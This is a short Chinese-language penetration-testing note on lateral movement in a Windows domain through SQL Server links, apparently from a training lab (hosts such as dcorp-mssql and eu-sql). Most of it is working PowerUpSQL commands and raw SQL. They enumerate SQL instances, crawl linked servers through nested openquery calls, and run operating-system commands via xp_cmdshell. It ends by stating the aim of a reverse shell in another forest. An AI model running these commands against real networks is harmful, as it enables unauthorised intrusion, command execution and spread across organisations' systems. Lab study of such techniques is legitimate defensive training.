# 域横向渗透

- 通过sql服务横向渗透，工具：[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- 连接数据库工具[heidisql](https://www.heidisql.com/download.php)

```powershell
Import-Module .\PowerupSQL.psd1
# SPN扫描SQL服务
Get-SQLInstanceDomain

# 检查是否有权限
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# 搜集信息
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# 寻找到远程服务器的链接
Get-SQLServerLink -Instance dcorp-mssql -Verbose
# 等同于使用heidisql连接后执行这个命令
select * from master..sysservers

# 列举数据库链接
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
# 等同于使用heidisql连接后执行这个命令
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')

# 执行命令
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" | ft
# 等同于使用heidisql连接后执行这个命令
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
```

通过滥用dcorp-mssql中的数据库链接，在eurocorp森林中的SQL服务器上获得一个反向shell
